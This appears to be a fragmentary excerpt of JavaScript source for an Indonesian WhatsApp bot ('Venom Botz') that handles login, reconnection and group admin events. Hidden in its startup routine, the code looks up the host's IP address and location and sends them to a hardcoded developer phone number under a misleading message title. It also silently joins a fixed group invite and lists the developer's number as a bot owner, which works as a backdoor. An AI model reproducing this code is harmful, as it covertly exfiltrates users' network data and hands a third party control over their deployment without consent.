...
nocache('./denz.js', module => console.log(color('|VENOM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [ 2, 2143, 3 ]
    denz.logger.level = 'warn'
    denz.browserDescription = ['Venom Botz','Desktop','3.0']
    await sleep(7000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|VENOM|'), color('Scan Kodenya bang atau ga scan kodenya bot gak on', 'red'))
    })
    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
    
    denz.on('credentials-updated', () => {
        console.log(color('|VENOM|'), color('credentials updated!', 'cyan'))
        })
     
      await denz.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/DQoalCEPUouGXfW9zD7EUU`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/DQoalCEPUouGXfW9zD7EUU','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Venom Botz', 'cyan'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Venom Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/thub.png'),sourceUrl:"https://wa.me/6287772961550?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("6287772961550@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Project pemuda",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/thub.png'),sourceUrl:"https://wa.me/6287772961550?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })
      
    denz.on('connecting', () => {
		console.log(color('|VENOM|'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
		})
	
	denz.on('open', () => {
	console.log(color('|VENOM|'), color('Connected, Ketik .menu di Whatsapp..!!', 'cyan'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('|VENOM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    denz.on('close', async () => {
        console.log(color('|VENOM|'), color('Disconnected.', 'cyan'))
        })
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   denz.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6287772961550@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
...
console.log(color('|VENOM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
...
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|VENOM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
    ...
    console.log(color('|VENOM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ GRUP CLOSED ] -\n\n_Yahh..Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|VENOM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    ...
    console.log(color('|VENOM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|VENOM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Subcribe : YT EDIT 3D (VENOM)', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By pemuda Teknologi - Recode by REVI GANZ' ,{ flashStyle: term.brightWhite })
